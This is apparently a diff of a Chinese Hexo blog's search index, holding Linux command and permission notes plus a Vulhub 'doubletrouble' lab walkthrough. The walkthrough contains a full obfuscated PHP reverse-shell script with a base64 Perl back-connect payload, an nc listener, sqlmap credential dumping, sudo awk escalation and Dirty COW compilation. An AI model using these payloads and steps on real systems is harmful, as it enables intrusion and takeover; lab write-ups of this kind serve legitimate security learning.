@@ -114,6 +114,26 @@
       </tags>
   </entry>
   <entry>
+    <title>Linux用户与用户权限</title>
+    <url>/2021/06/10/Linux%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/</url>
+    <content><![CDATA[<h2 id="用户命令"><a href="#用户命令" class="headerlink" title="###用户命令"></a>###用户命令</h2><p>useradd [用户名] //创建用户，同时创建用户组<br>useradd -G [已存在的组] [用户名]  //创建一个用户并加入一个已存在的组<br>useradd [用户名] -s [命令目录]  //手动指定用户登录后使用的shell<br>useradd -M  //创建用户时 不创建用户目录<br>useradd -N  //创建用户时 不创建用户组<br>usermod -g [用户组] [用户名]  //修改用户所在的主要组<br>usermod -G [用户组] [用户名]  //修改用户所在的副要组<br>usermod -l [新用户名] [旧用户名] //修改用户名<br>usermod -L [用户名] //锁一个用户 使其不能使用login登录 但可以在root用户下使用su登录<br>usermod -e [用户名] //修改用户登录有效期<br>usermod -s [shell] //修改用户登录后使用的shell,usermod -s /sbin/nologin 此命令可使账户无法登录<br>usermod -u [uid] //修改用户uid<br>userdel [用户名] //删除一个用户，但不会删除用户目录<br>userdel -r [用户名] //删除用户所有东西，包括用户目录</p>
+<h2 id="用户组命令"><a href="#用户组命令" class="headerlink" title="###用户组命令"></a>###用户组命令</h2><p>groupadd [组名] 创建用户组<br>groupadd -g [组编号] [组名] //创建用户组同时指定编号<br>groupmod -n [新组名] [旧组名] //修改用户组的组名<br>groupmod -g [组编号] [组名] //修改用户组的组编号<br>groupdel [组名] //删除指定用户组</p>
+<h2 id="用户权限命令"><a href="#用户权限命令" class="headerlink" title="###用户权限命令"></a>###用户权限命令</h2><p>权限说明：<br>ls -al 查看当前目录所有文件/文件夹权限</p>
+<p>r=读;  r=4  //读权限使文件可被读，例cat、more命令<br>w=写; w=2 //写权限使文件/文件夹可被改写,例echo、mv、vi等命令<br>x=执行;x=1 //执行权限使文件可被执行或者文件夹进入，例cd命令</p>
+<p>权限：rwx rwx rwx<br>分为三组 一组为三个<br>第一组：用户权限  第一组英文字母为u<br>第二组：用户组权限 第二组英文字母为g<br>第三组：其他用户权限 第三组英文字母为o<br>英文字母a代表all 表示三组全选</p>
+<p>Chmod命令：<br>chmod 755 a //修改a文件的权限为755=rwx r-x r-x<br>chmod a+x a //修改a文件中的所有权限 加上执行权限<br>chmod -r //递归修改权限</p>
+<p>chown命令：<br>chown root: root a //修改a文件的用户权限以及用户组权限为root<br>chown root: zhangsan a //修改a文件的用户权限为root,用户组权限为zhangsan<br>chown : root a //只修改a文件的用户组为root<br>chown -r  //递归修改</p>
+<p>各个信息代表的含义图解：</p>
+<p><img src="/2021/06/10/Linux%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/image-20210619193139915.png" alt="image-20210619193139915"></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux中VIM使用教程</title>
     <url>/2021/06/19/Linux%E4%B8%ADVIM%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<h1 id="Vim使用："><a href="#Vim使用：" class="headerlink" title="Vim使用："></a>Vim使用：</h1><p><img src="/2021/06/19/Linux%E4%B8%ADVIM%E4%BD%BF%E7%94%A8/image-20210619203205049.png" alt="image-20210619203205049"></p>
@@ -259,26 +279,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Linux用户与用户权限</title>
-    <url>/2021/06/10/Linux%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/</url>
-    <content><![CDATA[<h2 id="用户命令"><a href="#用户命令" class="headerlink" title="###用户命令"></a>###用户命令</h2><p>useradd [用户名] //创建用户，同时创建用户组<br>useradd -G [已存在的组] [用户名]  //创建一个用户并加入一个已存在的组<br>useradd [用户名] -s [命令目录]  //手动指定用户登录后使用的shell<br>useradd -M  //创建用户时 不创建用户目录<br>useradd -N  //创建用户时 不创建用户组<br>usermod -g [用户组] [用户名]  //修改用户所在的主要组<br>usermod -G [用户组] [用户名]  //修改用户所在的副要组<br>usermod -l [新用户名] [旧用户名] //修改用户名<br>usermod -L [用户名] //锁一个用户 使其不能使用login登录 但可以在root用户下使用su登录<br>usermod -e [用户名] //修改用户登录有效期<br>usermod -s [shell] //修改用户登录后使用的shell,usermod -s /sbin/nologin 此命令可使账户无法登录<br>usermod -u [uid] //修改用户uid<br>userdel [用户名] //删除一个用户，但不会删除用户目录<br>userdel -r [用户名] //删除用户所有东西，包括用户目录</p>
-<h2 id="用户组命令"><a href="#用户组命令" class="headerlink" title="###用户组命令"></a>###用户组命令</h2><p>groupadd [组名] 创建用户组<br>groupadd -g [组编号] [组名] //创建用户组同时指定编号<br>groupmod -n [新组名] [旧组名] //修改用户组的组名<br>groupmod -g [组编号] [组名] //修改用户组的组编号<br>groupdel [组名] //删除指定用户组</p>
-<h2 id="用户权限命令"><a href="#用户权限命令" class="headerlink" title="###用户权限命令"></a>###用户权限命令</h2><p>权限说明：<br>ls -al 查看当前目录所有文件/文件夹权限</p>
-<p>r=读;  r=4  //读权限使文件可被读，例cat、more命令<br>w=写; w=2 //写权限使文件/文件夹可被改写,例echo、mv、vi等命令<br>x=执行;x=1 //执行权限使文件可被执行或者文件夹进入，例cd命令</p>
-<p>权限：rwx rwx rwx<br>分为三组 一组为三个<br>第一组：用户权限  第一组英文字母为u<br>第二组：用户组权限 第二组英文字母为g<br>第三组：其他用户权限 第三组英文字母为o<br>英文字母a代表all 表示三组全选</p>
-<p>Chmod命令：<br>chmod 755 a //修改a文件的权限为755=rwx r-x r-x<br>chmod a+x a //修改a文件中的所有权限 加上执行权限<br>chmod -r //递归修改权限</p>
-<p>chown命令：<br>chown root: root a //修改a文件的用户权限以及用户组权限为root<br>chown root: zhangsan a //修改a文件的用户权限为root,用户组权限为zhangsan<br>chown : root a //只修改a文件的用户组为root<br>chown -r  //递归修改</p>
-<p>各个信息代表的含义图解：</p>
-<p><img src="/2021/06/10/Linux%E7%94%A8%E6%88%B7%E4%B8%8E%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90/image-20210619193139915.png" alt="image-20210619193139915"></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo文章本地图片插件</title>
     <url>/2021/06/19/hexo%E6%96%87%E7%AB%A0%E6%9C%AC%E5%9C%B0%E5%9B%BE%E7%89%87%E6%8F%92%E4%BB%B6/</url>
     <content><![CDATA[<h2 id="一、安装插件与修改配置文件"><a href="#一、安装插件与修改配置文件" class="headerlink" title="一、安装插件与修改配置文件"></a>一、安装插件与修改配置文件</h2><hr>
@@ -314,6 +314,244 @@
 ]]></content>
       <categories>
         <category>Hexo博客</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Linux命令</title>
+    <url>/2021/06/10/linux%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="##文件操作"></a>##文件操作</h2><h2 id="增："><a href="#增：" class="headerlink" title="###增："></a>###增：</h2><pre><code>touch [文件名.后缀]  //新建文件
+vi: wq //编辑保存并退出
+echo &gt; [名称].txt //写入内容至一个文本文件 若目录无改名字的文本文件 则会自动创建
+mkdir -p //新建一个文件夹 -p：递归创建
+</code></pre>
+<h2 id="删"><a href="#删" class="headerlink" title="###删:"></a>###删:</h2><pre><code>rmdir //只能删除空文件夹
+rm //删除一个文件/文件夹
+-r //将目录及以下文件全都删除
+-f //无需确认 直接删除
+-i //删除是会提示 默认为提示
+rm -rf * //删除改目录下所有文件 谨慎使用
+fg %[工作号] //结束某个在后台的任务
+</code></pre>
+<h2 id="查："><a href="#查：" class="headerlink" title="###查："></a>###查：</h2><pre><code>ls //查看当前目录
+-a //查看当前目录所有文件 包括隐藏文件
+-l //查看当前目录文件权限
+-t //将文件依建立时间之先后次序列出
+cat //查看文件内容
+tac //倒序查看文件内容
+head -n //显示头几行文本内容 默认为10行
+tail -n //显示末尾几行文本内容 默认为10行
+tail -f //实时显示新增文本内容
+grep //查找相关字符串内容
+find //索引搜索
+ps -aux //查询所有进程
+whereis * //查看*在什么路径
+jobs [选项] //查看后台
+more [选项] [文件名] //显示文件第一页
+whoami //查看用户
+w=who //查看所有登录的用户
+</code></pre>
+<h2 id="改："><a href="#改：" class="headerlink" title="###改："></a>###改：</h2><pre><code>cp // 复制一个文件/文件夹
+-r //若给出的源文件是个目录文件，将复制改目录下所有的子目录与文件
+-p //复制文件，并会会把修改时间和访问权限也复制到新文件中
+-f //覆盖已存在的目标文件不会提示
+cat /etc/passwd &gt; ./passwd 修改文件内容至passwd
+mv [文件名] [目标目录] //移动文件至目标目录
+mv [文件名] [新文件名] //修改文件名
+touch -t [时间] [文件名] 修改文件创建世界/最后修改时间
+</code></pre>
+<h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="##查看系统信息"></a>##查看系统信息</h2><pre><code>uname 命令：
+uname --help //查看帮助
+uname -n //显示计算机名
+uname -s //显示系统名称
+uname -a //显示系统信息
+uname -m //显示计算机类型
+uanme -v //显示系统版本与时间
+uname -r //显示系统发行编号
+</code></pre>
+<h2 id="Linux按键命令"><a href="#Linux按键命令" class="headerlink" title="##Linux按键命令"></a>##Linux按键命令</h2><pre><code>Tab //自动补全命令
+Ctrl+l //清屏
+Ctrl+u //清空至首行
+Ctrl+c //取消本次命令执行
+Ctrl+z //将程序放入后台
+</code></pre>
+<h2 id="Linux压缩命令"><a href="#Linux压缩命令" class="headerlink" title="##Linux压缩命令"></a>##Linux压缩命令</h2><pre><code>tar [选项] 源文件或目录.tar.gz // 打包文件
+tar 打包与压缩:
+tar cvf a.tar ./ //打包本地文件名称为a.tar
+tar xvf a.tar //解压a.tar文件
+
+tar zcvf b.tar.gz ./* //打包所有文件为b.tar.gz
+tar zxvf b.tar.gz  //解压文件 b.tar.gz
+</code></pre>
+<h2 id="PIng命令"><a href="#PIng命令" class="headerlink" title="##PIng命令"></a>##PIng命令</h2><pre><code>ping [目标主机/域名] //对目标主机发送数据包，网络测试
+traceroute baidu.com //自由追踪
+</code></pre>
+<h2 id="Linux命令补充："><a href="#Linux命令补充：" class="headerlink" title="##Linux命令补充："></a>##Linux命令补充：</h2><pre><code>关机指令： 
+poweroff //立刻关机
+halt //立刻关机
+init命令：  
+--run level 0: 关机
+--run level 3: 纯文本模式
+--run level 6: 重新启动
+reboot //立即重启
+Shutdown [选项] 时间
+选项： 
+-c: 取消前一个关机命令
+-h: 关机
+-r：重启
+用户登录命令; 
+login //登录
+基本语法：login [name][-p][-h主机名称]
+用户退出命令： 
+exit //退出控制台
+logout //注销用户
+apt-get:  
+sudo apt-get update 更新软件列表
+sudo apt-get upgrade 更新软件
+sudo apt-get install banner 安装一个文字图形输出
+</code></pre>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulhub靶场实验1</title>
+    <url>/2021/06/19/vulhub-doubletrouble/</url>
+    <content><![CDATA[<h2 id="doubletrouble"><a href="#doubletrouble" class="headerlink" title="doubletrouble"></a>doubletrouble</h2><p>VULHUB靶场实验</p>
+<h2 id="实验工具："><a href="#实验工具：" class="headerlink" title="实验工具："></a>实验工具：</h2><p>fscan：端口扫描工具</p>
+<p>nmap:十分好用的端口扫描工具</p>
+<p>攻击机:<font color="red"><code>Kali Linux</code></font></p>
+<p>IP:<font color="red"><code>192.168.12.24</code></font></p>
+<p>目标机:<font color="red"><code>Debian</code></font></p>
+<p>IP:<font color="red"><code>192.168.12.158</code></font></p>
+<h2 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h2><h4 id="步骤1-获取目标IP地址"><a href="#步骤1-获取目标IP地址" class="headerlink" title="步骤1:获取目标IP地址"></a>步骤1:获取目标IP地址</h4><p>​    方法一:使用fscan 扫描一下ip段，获取目标ip为192.168.12.178</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022162158827.png" alt="image-20211022162158827"></p>
+<p>​    方法二:使用Advanced IP Scanner 扫描指定IP段内的机器</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022162138694.png" alt="image-20211022162138694"></p>
+<p>​    </p>
+<h4 id="步骤2-使用Nmap扫描目标开放端口"><a href="#步骤2-使用Nmap扫描目标开放端口" class="headerlink" title="步骤2:使用Nmap扫描目标开放端口"></a>步骤2:使用Nmap扫描目标开放端口</h4><p>​    使用nmap扫描192.168.12.158，发现开放了22、80端口</p>
+<p>​    <code>nmap -A -p- 192.168.12.158 -oN /root/桌面/doubletrouble.txt</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022163553259.png" alt="image-20211022163553259"></p>
+<h4 id="步骤3：访问目标网站"><a href="#步骤3：访问目标网站" class="headerlink" title="步骤3：访问目标网站"></a>步骤3：访问目标网站</h4><p>​    浏览器访问192.168.12.158，发现一个Login页面</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022162732808.png" alt="image-20211022162732808"></p>
+<p>​    尝试了弱口令没有效果，这个页面没有办法处理，使用dirsearch扫描目录</p>
+<blockquote>
+<p>用法：dirsearch -u [域名/IP地址] -o [导出文件路径]</p>
+</blockquote>
+<p>​    <code>dirsearch -u 192.168.12.158 -o /root/桌面/dir.txt </code></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191439315.png" alt="image-20211022191439315"></p>
+<p>​    使用cat命令筛选出200响应码的路径</p>
+<p>​    <code>cat dir.txt | grep 200</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022191555234.png" alt="image-20211022191555234"></p>
+<h4 id="步骤4：利用stegseek图片解密"><a href="#步骤4：利用stegseek图片解密" class="headerlink" title="步骤4：利用stegseek图片解密"></a>步骤4：利用stegseek图片解密</h4><p>​    在/secret/目录中有个比较奇怪的图片，将它保存到本地<img src="/2021/06/19/vulhub-doubletrouble/image-20211022191657862.png" alt="image-20211022191657862"></p>
+<p>​    使用stegseek对图片进行解密</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github：https://github.com/RickdeJager/stegseek/releases</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>​    kali自带了rockyou.txt，但是需要解压一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gunzip /usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">sudo stegseek ./doubletrouble.jpg /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191902565.png" alt="image-20211022191902565"></p>
+<p>​    使用cat查看解密出的文件，得出账号密码</p>
+<pre><code>otisrush@localhost.como
+tis666   `
+</code></pre>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022191951620.png" alt="image-20211022191951620"></p>
+<p>​    进入之前的登录窗口尝试登录一下，登录成功<img src="/2021/06/19/vulhub-doubletrouble/image-20211022192102168.png" alt="image-20211022192102168"></p>
+<p>​    之前在翻目录的时候看到install写着qdPM 9.1</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022192315499.png" alt="image-20211022192315499"></p>
+<h2 id="qdPM漏洞利用"><a href="#qdPM漏洞利用" class="headerlink" title="qdPM漏洞利用"></a>qdPM漏洞利用</h2><h4 id="步骤6：php反弹shell"><a href="#步骤6：php反弹shell" class="headerlink" title="步骤6：php反弹shell"></a>步骤6：php反弹shell</h4><p>​    发现就是用户的myAccount界面的图片那一栏是可以上传文件的，我们上传一个php反弹shell的脚本</p>
+<p>​    <strong>PHP反弹shell脚本：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function which($pr) &#123;</span><br><span class="line">$path = execute(&quot;which $pr&quot;);</span><br><span class="line">return ($path ? $path : $pr);</span><br><span class="line">&#125;</span><br><span class="line">function execute($cfe) &#123;</span><br><span class="line">$res = &#x27;&#x27;;</span><br><span class="line">if ($cfe) &#123;</span><br><span class="line">if(function_exists(&#x27;exec&#x27;)) &#123;</span><br><span class="line">@exec($cfe,$res);</span><br><span class="line">$res = join(&quot;\n&quot;,$res);</span><br><span class="line">&#125; elseif(function_exists(&#x27;shell_exec&#x27;)) &#123;</span><br><span class="line">$res = @shell_exec($cfe);</span><br><span class="line">&#125; elseif(function_exists(&#x27;system&#x27;)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@system($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; elseif(function_exists(&#x27;passthru&#x27;)) &#123;</span><br><span class="line">@ob_start();</span><br><span class="line">@passthru($cfe);</span><br><span class="line">$res = @ob_get_contents();</span><br><span class="line">@ob_end_clean();</span><br><span class="line">&#125; elseif(@is_resource($f = @popen($cfe,&quot;r&quot;))) &#123;</span><br><span class="line">$res = &#x27;&#x27;;</span><br><span class="line">while(!@feof($f)) &#123;</span><br><span class="line">$res .= @fread($f,1024);</span><br><span class="line">&#125;</span><br><span class="line">@pclose($f);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $res;</span><br><span class="line">&#125;</span><br><span class="line">function cf($fname,$text)&#123;</span><br><span class="line">if($fp=@fopen($fname,&#x27;w&#x27;)) &#123;</span><br><span class="line">@fputs($fp,@base64_decode($text));</span><br><span class="line">@fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$yourip = &quot;your IP&quot;;</span><br><span class="line">$yourport = &#x27;your port&#x27;;</span><br><span class="line">$usedb = array(&#x27;perl&#x27;=&gt;&#x27;perl&#x27;,&#x27;c&#x27;=&gt;&#x27;c&#x27;);</span><br><span class="line">$back_connect=&quot;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&quot;.</span><br><span class="line">&quot;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&quot;.</span><br><span class="line">&quot;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&quot;.</span><br><span class="line">&quot;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&quot;.</span><br><span class="line">&quot;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&quot;.</span><br><span class="line">&quot;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&quot;.</span><br><span class="line">&quot;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&quot;;</span><br><span class="line">cf(&#x27;/tmp/.bc&#x27;,$back_connect);</span><br><span class="line">$res = execute(which(&#x27;perl&#x27;).&quot; /tmp/.bc $yourip $yourport &amp;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传shell脚本地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.xxx.xxx/index.php/myAccount</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022193246249.png" alt="image-20211022193246249"></p>
+<p>​    上传成功后，在kali中开启监听</p>
+<p>​    <code>nc -lnvp 4444</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193338295.png" alt="image-20211022193338295"></p>
+<p>​    打开uploads/users中有我们上传到的php脚本，点击php开始执行，shell反弹成功</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193545670.png" alt="image-20211022193545670"></p>
+<p>​    使用python改成伪交互式的shell</p>
+<p>​    <code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022193920424.png" alt="image-20211022193920424"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>​    </p>
+<p>​    查看当前用户能使用sudo的权限 ，可免密执行awk命令</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022194739519.png" alt="image-20211022194739519"></p>
+<p>​    awk命令可以进行提权</p>
+<p>​    <code>sudo awk &#39;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#39;</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022201042933.png" alt="image-20211022201042933"></p>
+<p>​    进入root目录，ls查看一下，下载doubletrouble.ova</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022201850780.png" alt="image-20211022201850780"></p>
+<p>​    首先查看一下是否有python3环境</p>
+<p>​    <code>python3 -V</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022202714437.png" alt="image-20211022202714437"></p>
+<p>​    使用python3开启一个http服务，然后从本地下载doubeltrouble.ova导入</p>
+<p>​    <code>python3 -m http.server 8888</code></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022202648058.png" alt="image-20211022202648058"></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022202817305.png" alt="image-20211022202817305"></p>
+<p>​    导入后扫描一下ip</p>
+<blockquote>
+<p>目标IP地址：192.168.12.58</p>
+</blockquote>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022205106315.png" alt="image-20211022205106315"></p>
+<p>​    使用nmap扫描一下开放端口</p>
+<p>​    <code>nmap -A -p- 192.168.12.58</code></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022210136685.png" alt="image-20211022210136685"></p>
+<p>​    开放端口22、80</p>
+<p>​    访问80端口，发现是一个登录界面</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022210925530.png" alt="image-20211022210925530"></p>
+<p>​    尝试使用万能密码，测试是否存在注入</p>
+<p>​    使用burp抓包，导出为txt文件，使用sqlmap测试</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022211235472.png" alt="image-20211022211235472"></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022211347686.png" alt="image-20211022211347686"></p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022211538042.png" alt="image-20211022211538042"></p>
+<pre><code> sqlmap跑出 uname存在时间延时盲注
+</code></pre>
+<p>​    使用sqlmap跑用户名</p>
+<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C username --dump --batch --threads 10</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022212640708.png" alt="image-20211022212640708"></p>
+<p>​    sqlmap跑密码</p>
+<p>​    <code>python3 sqlmap.py -r /root/桌面/sql.txt -D doubletrouble -T users -C password --dump --batch --threads 10</code></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022213344601.png" alt="image-20211022213344601"></p>
+<p>​    尝试在网站上登录，两个都不好使，尝试使用ssh登录</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022214311920.png" alt="image-20211022214311920"></p>
+<p>​    登陆成功，查看系统版本内核</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -r</span><br><span class="line">uname -a</span><br><span class="line">得到版本是3.2.0-4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022214436791.png" alt="image-20211022214436791"></p>
+<p>​    使用<code>cat /etc/*-release</code>看到是Debian 7系统</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022214642153.png" alt="image-20211022214642153"></p>
+<p>​    Debian 7系统可以通过脏牛提权</p>
+<blockquote>
+<p>github:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022214856123.png" alt="image-20211022214856123"></p>
+</blockquote>
+<p>​    在靶机上<code>gcc -v</code> 查看是否有gcc编译环境</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215047970.png" alt="image-20211022215047970"></p>
+<p>​    传到目标靶机上，然后进行编译</p>
+<p><code>scp /root/桌面/内网工具/脏牛/dirtycow/dirty.c clapton@192.168.12.58:/tmp </code><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215157188.png" alt="image-20211022215157188"></p>
+<p>​    <code>gcc -pthread dirty.c -o dirty -lcrypt</code> </p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215311781.png" alt="image-20211022215311781"></p>
+<p>​    然后去执行dirty</p>
+<p>​    <img src="/2021/06/19/vulhub-doubletrouble/image-20211022215345404.png" alt="image-20211022215345404"></p>
+<p>​    <code>su firefart</code></p>
+<p>​    登录到firefart上</p>
+<p><img src="/2021/06/19/vulhub-doubletrouble/image-20211022215539698.png" alt="image-20211022215539698">    </p>
+<p>​    成功获取到root权限以及flag</p>
+<blockquote>
+<p>flag:1B8EEA89EA92CECB931E3CC25AA8DE21</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Linux</category>
       </categories>
       <tags>
         <tag>基础</tag>
@@ -564,244 +802,6 @@ Username: 《input type=&quot;text&quot; name=&quot;user&quot;》
       </categories>
       <tags>
         <tag>HTML</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux命令</title>
-    <url>/2021/06/10/linux%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h2 id="文件操作"><a href="#文件操作" class="headerlink" title="##文件操作"></a>##文件操作</h2><h2 id="增："><a href="#增：" class="headerlink" title="###增："></a>###增：</h2><pre><code>touch [文件名.后缀]  //新建文件
-vi: wq //编辑保存并退出
-echo &gt; [名称].txt //写入内容至一个文本文件 若目录无改名字的文本文件 则会自动创建
-mkdir -p //新建一个文件夹 -p：递归创建
-</code></pre>
-<h2 id="删"><a href="#删" class="headerlink" title="###删:"></a>###删:</h2><pre><code>rmdir //只能删除空文件夹
-rm //删除一个文件/文件夹
--r //将目录及以下文件全都删除
--f //无需确认 直接删除
--i //删除是会提示 默认为提示
-rm -rf * //删除改目录下所有文件 谨慎使用
-fg %[工作号] //结束某个在后台的任务
-</code></pre>
-<h2 id="查："><a href="#查：" class="headerlink" title="###查："></a>###查：</h2><pre><code>ls //查看当前目录
--a //查看当前目录所有文件 包括隐藏文件
--l //查看当前目录文件权限
--t //将文件依建立时间之先后次序列出
-cat //查看文件内容
-tac //倒序查看文件内容
-head -n //显示头几行文本内容 默认为10行
-tail -n //显示末尾几行文本内容 默认为10行
-tail -f //实时显示新增文本内容
-grep //查找相关字符串内容
-find //索引搜索
-ps -aux //查询所有进程
-whereis * //查看*在什么路径
-jobs [选项] //查看后台
-more [选项] [文件名] //显示文件第一页
-whoami //查看用户
-w=who //查看所有登录的用户
-</code></pre>
-<h2 id="改："><a href="#改：" class="headerlink" title="###改："></a>###改：</h2><pre><code>cp // 复制一个文件/文件夹
--r //若给出的源文件是个目录文件，将复制改目录下所有的子目录与文件
--p //复制文件，并会会把修改时间和访问权限也复制到新文件中
--f //覆盖已存在的目标文件不会提示
-cat /etc/passwd &gt; ./passwd 修改文件内容至passwd
-mv [文件名] [目标目录] //移动文件至目标目录
-mv [文件名] [新文件名] //修改文件名
-touch -t [时间] [文件名] 修改文件创建世界/最后修改时间
-</code></pre>
-<h2 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="##查看系统信息"></a>##查看系统信息</h2><pre><code>uname 命令：
-uname --help //查看帮助
-uname -n //显示计算机名
-uname -s //显示系统名称
-uname -a //显示系统信息
-uname -m //显示计算机类型
-uanme -v //显示系统版本与时间
-uname -r //显示系统发行编号
-</code></pre>
-<h2 id="Linux按键命令"><a href="#Linux按键命令" class="headerlink" title="##Linux按键命令"></a>##Linux按键命令</h2><pre><code>Tab //自动补全命令
-Ctrl+l //清屏
-Ctrl+u //清空至首行
-Ctrl+c //取消本次命令执行
-Ctrl+z //将程序放入后台
-</code></pre>
-<h2 id="Linux压缩命令"><a href="#Linux压缩命令" class="headerlink" title="##Linux压缩命令"></a>##Linux压缩命令</h2><pre><code>tar [选项] 源文件或目录.tar.gz // 打包文件
-tar 打包与压缩:
-tar cvf a.tar ./ //打包本地文件名称为a.tar
-tar xvf a.tar //解压a.tar文件
-
-tar zcvf b.tar.gz ./* //打包所有文件为b.tar.gz
-tar zxvf b.tar.gz  //解压文件 b.tar.gz
-</code></pre>
-<h2 id="PIng命令"><a href="#PIng命令" class="headerlink" title="##PIng命令"></a>##PIng命令</h2><pre><code>ping [目标主机/域名] //对目标主机发送数据包，网络测试
-traceroute baidu.com //自由追踪
-</code></pre>
